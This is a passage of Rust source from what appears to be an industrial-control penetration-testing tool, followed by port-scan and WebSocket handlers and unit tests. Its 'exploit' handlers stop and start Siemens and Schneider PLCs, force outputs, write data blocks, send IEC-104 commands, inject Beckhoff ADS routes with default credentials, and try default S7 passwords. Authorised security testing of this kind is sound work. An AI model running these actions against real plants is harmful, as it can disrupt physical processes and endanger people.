                dev.vendor, dev.product_type, dev.product_code, dev.revision, dev.serial, dev.product_name
            ))
        }

        "rockwell/list_tags" => {
            use casket::vendors::rockwell::driver;
            let all_tags = driver::enumerate_tags(ip, device_enip_port(ip))?;
            let shown: Vec<&driver::LogixTag> = all_tags
                .iter()
                .filter(|t| !t.name.starts_with('_'))
                .take(50)
                .collect();
            if shown.is_empty() {
                return Ok("No tags found.".into());
            }
            let mut out = String::new();
            for t in &shown {
                writeln!(out, "{:<40} type=0x{:04x}", t.name, t.tag_type).ok();
            }
            Ok(out)
        }

        "snmp/sys_info" => {
            use casket::vendors::snmp::client;
            let community =
                device_field_str(ip, "community").unwrap_or_else(|| "public".to_string());
            let varbinds = client::walk(ip, eff_port(161), &community, ".1.3.6.1.2.1.1")?;
            if varbinds.is_empty() {
                return Ok("No SNMP data returned from system subtree.".into());
            }
            let mut out = String::new();
            for (oid, val) in &varbinds {
                writeln!(out, "{oid}: {}", val.display()).ok();
            }
            Ok(out)
        }

        "snmp/interfaces" => {
            use casket::vendors::snmp::client;
            let community =
                device_field_str(ip, "community").unwrap_or_else(|| "public".to_string());
            let varbinds = client::walk(ip, eff_port(161), &community, ".1.3.6.1.2.1.2")?;
            if varbinds.is_empty() {
                return Ok("No SNMP interface data returned.".into());
            }
            let mut out = String::new();
            for (oid, val) in &varbinds {
                writeln!(out, "{oid}: {}", val.display()).ok();
            }
            Ok(out)
        }

        "snmp/walk" => {
            use casket::vendors::snmp::client;
            let community = if username.is_empty() {
                "public"
            } else {
                username
            };
            let oid = if password.is_empty() {
                ".1.3.6.1.2.1.1"
            } else {
                password
            };
            let varbinds = client::walk(ip, eff_port(161), community, oid)?;
            if varbinds.is_empty() {
                return Ok(format!(
                    "No SNMP data returned for OID {oid} with community '{community}'."
                ));
            }
            let mut out = String::new();
            for (o, val) in &varbinds {
                writeln!(out, "{o}: {}", val.display()).ok();
            }
            Ok(out)
        }

        // ── Siemens S7Comm extended exploits ──────────────────────────────────
        "siemens/cpu_state" => {
            use casket::vendors::siemens::s7comm;
            let pw = device_field_str(ip, "password");
            let state = s7comm::get_cpu_state(ip, eff_port(102), 5, pw.as_deref());
            if state == "Unknown" {
                anyhow::bail!("Could not read CPU state from {ip}; check connectivity or password")
            }
            Ok(format!("CPU State: {state}"))
        }

        "siemens/io" => {
            use casket::vendors::siemens::s7comm;
            let pw = device_field_str(ip, "password");
            let data = s7comm::read_all_data(ip, eff_port(102), 5, pw.as_deref());
            let mut out = String::new();
            for (area, maybe_bits) in &data {
                let Some(bits) = maybe_bits else { continue };
                let prefix = match area.as_str() {
                    "inputs" => "I",
                    "outputs" => "Q",
                    "merkers" => "M",
                    _ => continue,
                };
                let mut addrs: Vec<&String> = bits.keys().collect();
                addrs.sort();
                for addr in addrs {
                    writeln!(
                        out,
                        "{prefix}{addr} = {}",
                        if bits[addr] != 0 { "ON" } else { "OFF" }
                    )
                    .ok();
                }
            }
            if out.is_empty() {
                Ok("No I/O data returned (device may require authentication).".into())
            } else {
                Ok(out)
            }
        }

        "siemens/toggle" => {
            use casket::vendors::siemens::s7comm;
            let stored_password = device_field_str(ip, "password");
            let effective_password = if password.is_empty() {
                stored_password.as_deref()
            } else {
                Some(password)
            };
            if s7comm::change_cpu_state(ip, eff_port(102), 5, effective_password) {
                let new_state = s7comm::get_cpu_state(ip, eff_port(102), 5, effective_password);
                Ok(format!("CPU state toggled. New state: {new_state}"))
            } else {
                anyhow::bail!("CPU state toggle failed on {ip}")
            }
        }

        "siemens/set_outputs" => {
            use casket::vendors::siemens::s7comm;
            let pw = device_field_str(ip, "password");
            let bits = if username.is_empty() {
                "00000000"
            } else {
                username
            };
            if s7comm::set_outputs(ip, bits, eff_port(102), 5, pw.as_deref()) {
                Ok(format!("Outputs set to {bits} on {ip}."))
            } else {
                anyhow::bail!("Output write failed on {ip} (authentication or protocol error)")
            }
        }

        "siemens/set_merkers" => {
            use casket::vendors::siemens::s7comm;
            let pw = device_field_str(ip, "password");
            let bits = if username.is_empty() {
                "00000000"
            } else {
                username
            };
            let offset: u32 = password.trim().parse().unwrap_or(0);
            if s7comm::set_merkers(ip, bits, offset, eff_port(102), 5, pw.as_deref()) {
                Ok(format!("Merkers at offset {offset} set to {bits} on {ip}."))
            } else {
                anyhow::bail!("Merker write failed on {ip}")
            }
        }

        "siemens/list_dbs" => {
            use casket::vendors::siemens::s7comm;
            let pw = device_field_str(ip, "password");
            let blocks = s7comm::list_data_blocks(ip, eff_port(102), 5, pw.as_deref());
            if blocks.is_empty() {
                return Ok("No data blocks found (device may require authentication).".into());
            }
            let mut out = String::new();
            for (db_num, size) in &blocks {
                writeln!(out, "DB{db_num}  ({size} bytes accessible)").ok();
            }
            Ok(out)
        }

        "siemens/read_db" => {
            use casket::vendors::siemens::s7comm;
            let pw = device_field_str(ip, "password");
            // username = "db:offset:length"  e.g. "1:0:16"
            let parts: Vec<&str> = username.splitn(3, ':').collect();
            let db: u16 = parts
                .first()
                .and_then(|s| s.trim().parse().ok())
                .unwrap_or(1);
            let offset: u16 = parts
                .get(1)
                .and_then(|s| s.trim().parse().ok())
                .unwrap_or(0);
            let length: u16 = parts
                .get(2)
                .and_then(|s| s.trim().parse().ok())
                .unwrap_or(16)
                .min(200);
            let data = s7comm::read_data_block(ip, db, offset, length, eff_port(102), 5, pw.as_deref())?;
            let hex: String = data.iter().fold(String::new(), |mut s, b| {
                let _ = write!(s, "{b:02x} ");
                s
            });
            Ok(format!(
                "DB{db} offset {offset} ({} bytes):\n{}",
                data.len(),
                hex.trim_end()
            ))
        }

        "siemens/write_db" => {
            use casket::vendors::siemens::s7comm;
            let pw = device_field_str(ip, "password");
            // username = "db:offset"  password = hex bytes e.g. "deadbeef"
            let parts: Vec<&str> = username.splitn(2, ':').collect();
            let db: u16 = parts
                .first()
                .and_then(|s| s.trim().parse().ok())
                .unwrap_or(1);
            let offset: u16 = parts
                .get(1)
                .and_then(|s| s.trim().parse().ok())
                .unwrap_or(0);
            let hex_str: String = password.chars().filter(|c| !c.is_whitespace()).collect();
            if hex_str.is_empty() || !hex_str.len().is_multiple_of(2) {
                anyhow::bail!("Data must be an even number of hex chars (e.g. 'deadbeef')");
            }
            let data: Vec<u8> = (0..hex_str.len())
                .step_by(2)
                .filter_map(|i| u8::from_str_radix(&hex_str[i..i + 2], 16).ok())
                .collect();
            let ok = s7comm::write_data_block(ip, db, offset, &data, eff_port(102), 5, pw.as_deref())?;
            if ok {
                Ok(format!(
                    "Wrote {} bytes to DB{db} offset {offset} on {ip}.",
                    data.len()
                ))
            } else {
                anyhow::bail!("DB write was not confirmed by PLC")
            }
        }

        "siemens/try_defaults" => {
            use crate::creds;
            use casket::vendors::default_creds;
            use casket::vendors::siemens::s7comm;
            if !s7comm::probe_auth_required(ip, eff_port(102), 5) {
                return Ok(format!(
                    "{ip} has no access protection — no password needed."
                ));
            }
            let loaded = creds::load();
            let all_passwords: Vec<&str> = loaded
                .siemens
                .passwords
                .iter()
                .map(std::string::String::as_str)
                .chain(default_creds::SIEMENS_S7_PASSWORDS.iter().copied())
                .collect();
            for &pw in &all_passwords {
                let display = if pw.is_empty() { "(empty)" } else { pw };
                let state = s7comm::get_cpu_state(ip, eff_port(102), 5, Some(pw));
                if state != "Unknown" {
                    return Ok(format!(
                        "Password accepted: \"{display}\"\nCPU State: {state}"
                    ));
                }
            }
            Ok(format!(
                "None of the {} passwords worked. \
                 Add custom passwords to ~/.config/scadaver/creds.toml [siemens] section.",
                all_passwords.len()
            ))
        }

        // ── Beckhoff ADS extended exploits ────────────────────────────────────
        "beckhoff/info" => {
            use casket::core::network::local_ip_for;
            use casket::vendors::beckhoff::{ads, scan};
            let local_netid = ads::build_local_netid(&local_ip_for(ip));
            let dev = scan::discover_ip_with_port(ip, 3, true, 0)
                .ok()
                .and_then(|mut v| {
                    if v.is_empty() {
                        None
                    } else {
                        Some(v.remove(0))
                    }
                })
                .ok_or_else(|| anyhow::anyhow!("No Beckhoff device responded at {ip}"))?;
            match scan::get_device_info_full(&dev, &local_netid, 0) {
                Some(info) => {
                    let mut out = String::new();
                    writeln!(out, "Name:     {}", info.name).ok();
                    writeln!(out, "NetID:    {}", info.netid).ok();
                    writeln!(out, "TC Ver:   {}", info.tc_version).ok();
                    if let Some(t) = &info.target_type {
                        writeln!(out, "Type:     {t}").ok();
                    }
                    if let Some(m) = &info.hardware_model {
                        writeln!(out, "Hardware: {m}").ok();
                    }
                    if let Some(s) = &info.serial {
                        writeln!(out, "Serial:   {s}").ok();
                    }
                    if let Some(o) = &info.os_name {
                        writeln!(out, "OS:       {o}").ok();
                    }
                    Ok(out)
                }
                None => Ok(format!(
                    "Connected to {ip} (TC2 device or no XML info available)\n\
                     Name: {}\nNetID: {}\nTC Ver: {}",
                    dev.name, dev.netid_str, dev.tc_version
                )),
            }
        }

        "beckhoff/state_run" => {
            use casket::core::network::local_ip_for;
            use casket::vendors::beckhoff::{ads, scan};
            let local_netid = ads::build_local_netid(&local_ip_for(ip));
            let dev = scan::discover_ip_with_port(ip, 3, true, 0)
                .ok()
                .and_then(|mut v| {
                    if v.is_empty() {
                        None
                    } else {
                        Some(v.remove(0))
                    }
                })
                .ok_or_else(|| anyhow::anyhow!("No Beckhoff device responded at {ip}"))?;
            scan::set_twincat_state(&dev, &local_netid, "run", 0)?;
            Ok(format!("TwinCAT state set to RUN on {ip}."))
        }

        "beckhoff/state_config" => {
            use casket::core::network::local_ip_for;
            use casket::vendors::beckhoff::{ads, scan};
            let local_netid = ads::build_local_netid(&local_ip_for(ip));
            let dev = scan::discover_ip_with_port(ip, 3, true, 0)
                .ok()
                .and_then(|mut v| {
                    if v.is_empty() {
                        None
                    } else {
                        Some(v.remove(0))
                    }
                })
                .ok_or_else(|| anyhow::anyhow!("No Beckhoff device responded at {ip}"))?;
            scan::set_twincat_state(&dev, &local_netid, "config", 0)?;
            Ok(format!("TwinCAT state set to CONFIG on {ip}."))
        }

        "beckhoff/get_state" => {
            use casket::core::network::local_ip_for;
            use casket::vendors::beckhoff::{ads, scan};
            let local_netid = ads::build_local_netid(&local_ip_for(ip));
            let dev = scan::discover_ip_with_port(ip, 3, true, 0)
                .ok()
                .and_then(|mut v| {
                    if v.is_empty() {
                        None
                    } else {
                        Some(v.remove(0))
                    }
                })
                .ok_or_else(|| anyhow::anyhow!("No Beckhoff device responded at {ip}"))?;
            let state = scan::get_state(&dev, &local_netid, 0);
            Ok(format!("TwinCAT runtime state: {state}"))
        }

        "beckhoff/add_route" => {
            use casket::core::network::local_ip_for;
            use casket::vendors::beckhoff::{ads, scan};
            let local_ip = local_ip_for(ip);
            let local_netid = ads::build_local_netid(&local_ip);
            let user = if username.is_empty() {
                "Administrator"
            } else {
                username
            };
            let pass = if password.is_empty() { "1" } else { password };
            let dev = scan::discover_ip(ip, 3, true)
                .ok()
                .and_then(|mut v| {
                    if v.is_empty() {
                        None
                    } else {
                        Some(v.remove(0))
                    }
                })
                .ok_or_else(|| {
                    anyhow::anyhow!(
                        "No Beckhoff device responded at {ip} \
                     (route injection requires UDP discovery on port 48899)"
                    )
                })?;
            if scan::add_route(&dev, &local_ip, &local_netid, user, pass, Some("scadaver")) {
                Ok(format!(
                    "ADS route added to {ip}: this host ({local_ip}) now has ADS access."
                ))
            } else {
                anyhow::bail!("Route injection failed (wrong credentials or device denied)")
            }
        }

        "beckhoff/symbols" => {
            use casket::core::network::local_ip_for;
            use casket::vendors::beckhoff::{ads, scan};
            let local_netid = ads::build_local_netid(&local_ip_for(ip));
            let dev = scan::discover_ip_with_port(ip, 3, true, 0)
                .ok()
                .and_then(|mut v| {
                    if v.is_empty() {
                        None
                    } else {
                        Some(v.remove(0))
                    }
                })
                .ok_or_else(|| anyhow::anyhow!("No Beckhoff device responded at {ip}"))?;
            let symbols = scan::enumerate_symbols(&dev, &local_netid, 0);
            if symbols.is_empty() {
                return Ok(
                    "No symbols returned (device may not support ADS symbol upload).".into(),
                );
            }
            let mut out = String::new();
            for sym in symbols.iter().take(200) {
                let val = sym.value_str.as_deref().unwrap_or("-");
                writeln!(out, "{:<48}  {:>10}  {}", sym.name, val, sym.type_name).ok();
            }
            if symbols.len() > 200 {
                writeln!(out, "... ({} total, showing first 200)", symbols.len()).ok();
            }
            Ok(out)
        }

        "beckhoff/write_symbol" => {
            use casket::core::network::local_ip_for;
            use casket::vendors::beckhoff::{ads, scan};
            let local_netid = ads::build_local_netid(&local_ip_for(ip));
            if username.is_empty() {
                anyhow::bail!("Symbol name required in Username field");
            }
            let hex_str: String = password.chars().filter(|c| !c.is_whitespace()).collect();
            if hex_str.is_empty() || !hex_str.len().is_multiple_of(2) {
                anyhow::bail!(
                    "Symbol value required as hex bytes in Password field \
                     (e.g. '01' for BOOL true, '2a00' for INT 42)"
                );
            }
            let value_bytes: Vec<u8> = (0..hex_str.len())
                .step_by(2)
                .filter_map(|i| u8::from_str_radix(&hex_str[i..i + 2], 16).ok())
                .collect();
            let dev = scan::discover_ip_with_port(ip, 3, true, 0)
                .ok()
                .and_then(|mut v| {
                    if v.is_empty() {
                        None
                    } else {
                        Some(v.remove(0))
                    }
                })
                .ok_or_else(|| anyhow::anyhow!("No Beckhoff device responded at {ip}"))?;
            let ok = scan::write_symbol_value(&dev, &local_netid, username, value_bytes, 0)?;
            if ok {
                Ok(format!("Symbol '{username}' written on {ip}."))
            } else {
                anyhow::bail!("Symbol write was not confirmed by device")
            }
        }

        // ── Schneider FC90 exploits ────────────────────────────────────────────
        "schneider/fc90_stop" => {
            use casket::vendors::schneider::modicon_fc90;
            let ok = modicon_fc90::stop_plc(ip, 0)?;
            if ok {
                Ok(format!("PLC STOP sent via FC90 to {ip}."))
            } else {
                anyhow::bail!("FC90 STOP not acknowledged by {ip}")
            }
        }

        "schneider/fc90_start" => {
            use casket::vendors::schneider::modicon_fc90;
            let ok = modicon_fc90::start_plc(ip, 0)?;
            if ok {
                Ok(format!("PLC START sent via FC90 to {ip}."))
            } else {
                anyhow::bail!("FC90 START not acknowledged by {ip}")
            }
        }

        "schneider/fc90_stop_tm221" => {
            use casket::vendors::schneider::modicon_fc90;
            let ok = modicon_fc90::stop_tm221(ip, 0)?;
            if ok {
                Ok(format!("TM221 STOP sent via FC90 to {ip}."))
            } else {
                anyhow::bail!("FC90 TM221 STOP not acknowledged by {ip}")
            }
        }

        "schneider/fc90_start_tm221" => {
            use casket::vendors::schneider::modicon_fc90;
            let ok = modicon_fc90::start_tm221(ip, 0)?;
            if ok {
                Ok(format!("TM221 START sent via FC90 to {ip}."))
            } else {
                anyhow::bail!("FC90 TM221 START not acknowledged by {ip}")
            }
        }

        "schneider/fc90_force" => {
            use casket::vendors::schneider::modicon_fc90::{self, ForceState};
            // username = output byte (hex 0x11..0x16 or decimal), password = "on"/"off"/"unforce"
            let output_byte: u8 = u8::from_str_radix(username.trim().trim_start_matches("0x"), 16)
                .or_else(|_| username.trim().parse())
                .unwrap_or(0x11);
            let state = match password.trim().to_ascii_lowercase().as_str() {
                "off" | "0" | "false" => ForceState::Off,
                "unforce" | "none" | "reset" => ForceState::Unforce,
                _ => ForceState::On,
            };
            let ok = modicon_fc90::force_output_bit(ip, 0, output_byte, state)?;
            if ok {
                Ok(format!(
                    "Force output 0x{output_byte:02X} to {state:?} on {ip}."
                ))
            } else {
                anyhow::bail!("FC90 force output not acknowledged by {ip}")
            }
        }

        // ── Rockwell Allen-Bradley tag read / write ────────────────────────────
        "rockwell/read_tag" => {
            use casket::vendors::rockwell::driver;
            if username.is_empty() {
                anyhow::bail!("Tag name required in Username field");
            }
            let data = driver::read_tag(ip, device_enip_port(ip), username)?;
            if data.len() < 2 {
                anyhow::bail!("Read returned too few bytes for tag '{username}'");
            }
            let tag_type = u16::from_le_bytes([data[0], data[1]]);
            let decoded = driver::decode_value(tag_type, &data, None);
            Ok(format!(
                "Tag:   {username}\nType:  {}\nValue: {decoded}",
                driver::type_name(tag_type)
            ))
        }

        "rockwell/write_tag" => {
            anyhow::bail!(
                "EtherNet/IP/Rockwell tag writes are disabled in the web interface; use approved change-control tooling"
            )
        }

        // ── IEC 60870-5-104 Double Command ────────────────────────────────────
        "iec104/dc" => {
            use casket::vendors::iec104::client;
            // username = IOA address, password = state (1=off, 2=on, 3=indeterminate)
            let ioa: u32 = username.trim().parse().unwrap_or(1);
            let state: u8 = match password.trim().to_ascii_lowercase().as_str() {
                "off" | "0" | "false" | "1" => 1,
                "indeterminate" | "3" => 3,
                _ => 2,
            };
            let mut session = client::connect(ip, eff_port(2404))?;
            let confirmed = client::double_command(&mut session, ioa, state)?;
            if confirmed {
                Ok(format!(
                    "Double command IOA {ioa} state {state} confirmed on {ip}."
                ))
            } else {
                anyhow::bail!(
                    "Double command IOA {ioa} received negative acknowledgement from {ip}"
                )
            }
        }

        // ── BACnet/IP ─────────────────────────────────────────────────────────────
        "bacnet/0" => {
            use casket::vendors::bacnet::client as bacnet;
            match bacnet::scan_ip_with_port(ip, device_bacnet_port(ip), 5) {
                Some(dev) => Ok(format!(
                    "Instance ID : {}\nVendor      : {} (ID {})\nObject Name : {}\nDescription : {}\nFirmware    : {}\nMax APDU    : {}",
                    dev.instance_id, dev.vendor_name, dev.vendor_id,
                    dev.object_name, dev.description, dev.firmware_revision, dev.max_apdu
                )),
                None => anyhow::bail!("No BACnet device found at {ip}"),
            }
        }

        "bacnet/1" => {
            use casket::vendors::bacnet::client as bacnet;
            let timeout = std::time::Duration::from_secs(5);
            let bacnet_port = device_bacnet_port(ip);
            let Some(dev) = bacnet::scan_ip_with_port(ip, bacnet_port, 5) else {
                anyhow::bail!("No BACnet device found at {ip}");
            };
            let props = [
                (bacnet::PROP_OBJECT_NAME, "Object-Name"),
                (bacnet::PROP_DESCRIPTION, "Description"),
                (bacnet::PROP_FIRMWARE_REVISION, "Firmware-Revision"),
                (bacnet::PROP_VENDOR_NAME, "Vendor-Name"),
                (bacnet::PROP_VENDOR_IDENTIFIER, "Vendor-Identifier"),
            ];
            let mut out = String::new();
            for (prop_id, label) in props {
                if let Some(val) = bacnet::read_property_with_port(
                    ip,
                    bacnet_port,
                    dev.instance_id,
                    prop_id,
                    timeout,
                ) {
                    writeln!(out, "{label}: {val}").ok();
                }
            }
            if out.is_empty() {
                anyhow::bail!("No properties readable from {ip}");
            }
            Ok(out)
        }

        "bacnet/2" => {
            use casket::vendors::bacnet::client as bacnet;
            let timeout = std::time::Duration::from_secs(5);
            let devices = bacnet::who_is_broadcast(timeout);
            if devices.is_empty() {
                return Ok("No BACnet devices responded to Who-Is broadcast.".into());
            }
            let mut out = String::new();
            for d in &devices {
                writeln!(
                    out,
                    "  {} — instance {} vendor_id {}",
                    d.ip, d.instance_id, d.vendor_id
                )
                .ok();
                if !d.object_name.is_empty() {
                    writeln!(out, "    Name: {}", d.object_name).ok();
                }
            }
            Ok(format!("{} device(s):\n{out}", devices.len()))
        }

        // ── DNP3 TCP ──────────────────────────────────────────────────────────────
        "dnp3/0" => {
            use casket::vendors::dnp3::client as dnp3;
            let timeout = std::time::Duration::from_secs(5);
            let attrs = dnp3::read_device_attributes_with_port(ip, device_dnp3_port(ip), timeout);
            if attrs.is_empty() {
                anyhow::bail!("No DNP3 device attributes returned from {ip}");
            }
            let mut pairs: Vec<_> = attrs.iter().collect();
            pairs.sort_by_key(|(k, _)| k.as_str());
            let mut out = String::new();
            for (k, v) in pairs {
                writeln!(out, "{k}: {v}").ok();
            }
            Ok(out)
        }

        "dnp3/1" => {
            use casket::vendors::dnp3::client as dnp3;
            let timeout = std::time::Duration::from_secs(5);
            let lines = dnp3::read_integrity_poll_with_port(ip, device_dnp3_port(ip), timeout);
            if lines.is_empty() {
                anyhow::bail!("No DNP3 integrity poll data returned from {ip}");
            }
            Ok(lines.join("\n"))
        }

        // ── OPC-UA ────────────────────────────────────────────────────────────────
        "opcua/0" => {
            use casket::vendors::opcua::client as opcua;
            let timeout = std::time::Duration::from_secs(5);
            let opcua_port = device_opcua_port(ip);
            let Some(server) = opcua::detect(ip, opcua_port, timeout) else {
                anyhow::bail!("No OPC-UA server found at {ip}:{opcua_port}");
            };
            let endpoints = opcua::get_endpoints(ip, opcua_port, timeout);
            let anon = endpoints
                .iter()
                .any(|e| e.allows_anonymous && e.security_mode == "None");
            let mut out = format!(
                "IP         : {}\nPort       : {}\nEndpoints  : {}\nAnon access: {}\n",
                server.ip,
                server.port,
                endpoints.len(),
                if anon {
                    "YES — unauthenticated access possible"
                } else {
                    "No"
                }
            );
            for ep in &endpoints {
                writeln!(out, "  [{}] {}", ep.security_mode, ep.url).ok();
            }
            Ok(out)
        }

        "opcua/1" => {
            use casket::vendors::opcua::client as opcua;
            let timeout = std::time::Duration::from_secs(5);
            let opcua_port = device_opcua_port(ip);
            let endpoints = opcua::get_endpoints(ip, opcua_port, timeout);
            if endpoints.is_empty() {
                anyhow::bail!("No OPC-UA endpoints returned from {ip}:{opcua_port}");
            }
            let mut out = String::new();
            for (i, ep) in endpoints.iter().enumerate() {
                writeln!(
                    out,
                    "[{i}] mode={} policy={}\n    {} (anon={})",
                    ep.security_mode, ep.security_policy, ep.url, ep.allows_anonymous
                )
                .ok();
            }
            Ok(out)
        }

        "opcua/2" => {
            use casket::vendors::opcua::client as opcua;
            let timeout = std::time::Duration::from_secs(5);
            let endpoints = opcua::get_endpoints(ip, device_opcua_port(ip), timeout);
            let vuln: Vec<_> = endpoints
                .iter()
                .filter(|e| e.allows_anonymous && e.security_mode == "None")
                .collect();
            if vuln.is_empty() {
                Ok(format!(
                    "No anonymous None-security endpoints found at {ip}:4840.\nAll {} endpoint(s) require authentication or encryption.",
                    endpoints.len()
                ))
            } else {
                let mut out = format!("[VULN] Found {} anonymous endpoint(s):\n", vuln.len());
                for ep in &vuln {
                    writeln!(out, "  [VULN] {}", ep.url).ok();
                    writeln!(out, "  Anonymous connect allowed with no encryption").ok();
                }
                Ok(out)
            }
        }

        _ => anyhow::bail!("Unknown exploit: {id}"),
    }
}

// ─── Port scanner ─────────────────────────────────────────────────────────────

async fn api_portscan(
    State(state): State<Arc<AppState>>,
    headers: HeaderMap,
    Json(req): Json<PortscanReq>,
) -> Response {
    if let Some(err) = require_api_key(&headers, &state.api_key) {
        return err.into_response();
    }
    if let Err(error) = validate_ipv4(&req.ip, "Port-scan IP") {
        return bad_request(error);
    }
    let timeout = req.timeout.clamp(1, 60);
    let mut extra_ports = req.extra_ports;
    extra_ports.truncate(100);
    let result = tokio::task::spawn_blocking(move || {
        casket::core::portscan::scan_ot_ports(&req.ip, timeout, &extra_ports)
    })
    .await;

    match result {
        Ok(results) => {
            let ports: Vec<Value> = results
                .into_iter()
                .filter(|r| r.open)
                .map(|r| {
                    json!({
                        "port": r.port,
                        "service": r.service,
                        "banner": r.banner,
                    })
                })
                .collect();
            Json(json!({"ports": ports})).into_response()
        }
        Err(e) => Json(json!({"ports": [], "error": join_err(&e)})).into_response(),
    }
}

// ─── WebSocket events push ────────────────────────────────────────────────────

async fn ws_events(
    ws: WebSocketUpgrade,
    headers: axum::http::HeaderMap,
    Query(auth): Query<WebSocketAuthQuery>,
    State(state): State<Arc<AppState>>,
) -> Response {
    if let Some(err) = require_api_key_or_query(&headers, &auth.key, &state.api_key) {
        return err.into_response();
    }
    let origin_ok = headers
        .get("origin")
        .and_then(|v| v.to_str().ok())
        .is_some_and(|o| o.starts_with("http://localhost") || o.starts_with("http://127.0.0.1"));
    if !origin_ok {
        return axum::http::StatusCode::FORBIDDEN.into_response();
    }
    let rx = state.events_tx.subscribe();
    ws.on_upgrade(move |socket| events_loop(socket, rx))
}

async fn events_loop(mut socket: WebSocket, mut rx: broadcast::Receiver<DeviceEvent>) {
    loop {
        match rx.recv().await {
            Ok(ev) => {
                let Ok(msg) = serde_json::to_string(&ev) else {
                    break;
                };
                if socket.send(Message::Text(msg)).await.is_err() {
                    break;
                }
            }
            Err(broadcast::error::RecvError::Closed) => break,
            Err(broadcast::error::RecvError::Lagged(_)) => {}
        }
    }
}

// ─── WebSocket monitor ────────────────────────────────────────────────────────

async fn ws_monitor(
    ws: WebSocketUpgrade,
    headers: axum::http::HeaderMap,
    State(state): State<Arc<AppState>>,
    Path(ip): Path<String>,
    Query(q): Query<MonitorQuery>,
) -> Response {
    if let Some(err) = require_api_key_or_query(&headers, &q.key, &state.api_key) {
        return err.into_response();
    }
    let origin_ok = headers
        .get("origin")
        .and_then(|v| v.to_str().ok())
        .is_some_and(|o| o.starts_with("http://localhost") || o.starts_with("http://127.0.0.1")); // no Origin header = non-browser client; deny by default
    if !origin_ok {
        return axum::http::StatusCode::FORBIDDEN.into_response();
    }
    ws.on_upgrade(move |socket| monitor_loop(socket, ip, q.vendor))
}

async fn monitor_loop(mut socket: WebSocket, ip: String, vendor: String) {
    loop {
        let ip2 = ip.clone();
        let vendor2 = vendor.clone();
        let payload = match tokio::task::spawn_blocking(move || {
            read_tags_for_vendor(&ip2, &vendor2, None, None)
        })
        .await
        {
            Ok(tags) => json!({"tags": tags, "error": null}),
            Err(e) => json!({"tags": {}, "error": join_err(&e)}),
        };

        let Ok(msg) = serde_json::to_string(&payload) else {
            break;
        };

        if socket.send(Message::Text(msg)).await.is_err() {
            break;
        }

        sleep(Duration::from_secs(2)).await;
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Integration fixtures must be stopped even if an assertion fails. Without
    /// this guard, a failed high-port test can leave a loopback simulator bound
    /// and cause the next test to connect to stale protocol behavior.
    struct SimulatorGuard(std::process::Child);

    impl Drop for SimulatorGuard {
        fn drop(&mut self) {
            let _ = self.0.kill();
            let _ = self.0.wait();
        }
    }

    // ── require_api_key ────────────────────────────────────────────────────────

    fn make_headers_with_key(key: &str) -> HeaderMap {
        let mut h = HeaderMap::new();
        h.insert("x-api-key", key.parse().unwrap());
        h
    }

    #[test]
    fn require_api_key_correct_returns_none() {
        let h = make_headers_with_key("abc123");
        assert!(require_api_key(&h, "abc123").is_none());
    }

    #[test]
    fn require_api_key_wrong_returns_401() {
        let h = make_headers_with_key("wrongkey");
        let result = require_api_key(&h, "rightkey");
        assert!(result.is_some());
        assert_eq!(result.unwrap().0, StatusCode::UNAUTHORIZED);
    }

    #[test]
    fn require_api_key_missing_header_returns_401() {
        let h = HeaderMap::new();
        let result = require_api_key(&h, "somekey");
        assert!(result.is_some());
        assert_eq!(result.unwrap().0, StatusCode::UNAUTHORIZED);
    }

    #[test]
    fn require_api_key_empty_key_vs_empty_returns_none() {
        let h = make_headers_with_key("");
        assert!(require_api_key(&h, "").is_none());
    }

    #[test]
    fn websocket_query_key_is_accepted_when_browser_headers_are_unavailable() {
        assert!(require_api_key_or_query(&HeaderMap::new(), "abc123", "abc123").is_none());
        assert!(require_api_key_or_query(&HeaderMap::new(), "wrong", "abc123").is_some());
    }

    #[test]
    fn ipv4_validation_accepts_private_and_public_ranges() {
        for ip in [
            "10.2.10.25",
            "172.16.1.1",
            "192.168.1.1",
            "91.1.2.3",
            "161.2.3.4",
        ] {
            assert!(
                validate_ipv4(ip, "Probe IP").is_ok(),
                "{ip} should be accepted"
            );
        }
    }

    #[test]
    fn ipv4_validation_rejects_invalid_addresses() {
        for ip in ["10.x.x.x", "10.2.10", "10.2.10.256", "not-an-ip"] {
            assert!(
                validate_ipv4(ip, "Probe IP").is_err(),
                "{ip} should be rejected"
            );
        }
    }

    #[test]
    fn cidr_validation_requires_an_ipv4_network() {
        assert!(validate_ipv4_cidr("10.2.10.0/24").is_ok());
        assert!(validate_ipv4_cidr(TEST_LOOPBACK_CIDR).is_ok());
        assert!(validate_ipv4_cidr("91.1.0.0/16").is_ok());
        assert!(validate_ipv4_cidr("10.2.10.25").is_err());
        assert!(validate_ipv4_cidr("10.2.10.0/33").is_err());
        assert!(validate_ipv4_cidr("2001:db8::/32").is_err());
    }

    #[test]
    fn test_loopback_harness_exposes_only_a_loopback_adapter() {
        let iface = test_loopback_interface();
        assert_eq!(iface.name, "SCADAver test loopback");
        assert_eq!(iface.ip, TEST_LOOPBACK_IP);
        assert_eq!(iface.netmask, "255.255.255.255");
    }

    #[test]
    fn test_loopback_harness_rejects_external_targets() {
        assert!(validate_test_loopback_ip(TEST_LOOPBACK_IP, true).is_ok());
        assert!(validate_test_loopback_ip("10.2.10.25", true).is_err());
        assert!(
            validate_test_loopback_scan_scope(TEST_LOOPBACK_IP, TEST_LOOPBACK_CIDR, true).is_ok()
        );
        assert!(validate_test_loopback_scan_scope(TEST_LOOPBACK_IP, "10.2.10.0/24", true).is_err());
        assert!(validate_test_loopback_scan_scope("10.2.10.25", TEST_LOOPBACK_CIDR, true).is_err());
    }

    #[test]
    fn port_override_validation_rejects_zero_only() {
        assert!(validate_optional_port(None, "Target port").is_ok());
        assert!(validate_optional_port(Some(502), "Target port").is_ok());
        assert!(validate_optional_port(Some(0), "Target port").is_err());
    }

    #[test]
    fn read_only_protocols_support_explicit_scan_ports_when_implemented() {
        assert!(protocol_supports_scan_port_override("bacnet"));
        assert!(protocol_supports_scan_port_override("dnp3"));
        assert!(protocol_supports_scan_port_override("modbus"));
        assert!(protocol_supports_scan_port_override("schneider"));
        assert!(protocol_supports_scan_port_override("modicon"));
        assert!(protocol_supports_scan_port_override("siemens"));
        assert!(protocol_supports_scan_port_override("s7"));
        assert!(protocol_supports_scan_port_override("beckhoff"));
        assert!(protocol_supports_scan_port_override("ads"));
        assert!(protocol_supports_scan_port_override("enip"));
        assert!(protocol_supports_scan_port_override("rockwell"));
        assert!(protocol_supports_scan_port_override("mitsubishi"));
        assert!(protocol_supports_scan_port_override("omron"));
        assert!(protocol_supports_scan_port_override("fins"));
        assert!(protocol_supports_scan_port_override("phoenix"));
        assert!(protocol_supports_scan_port_override("ewon"));
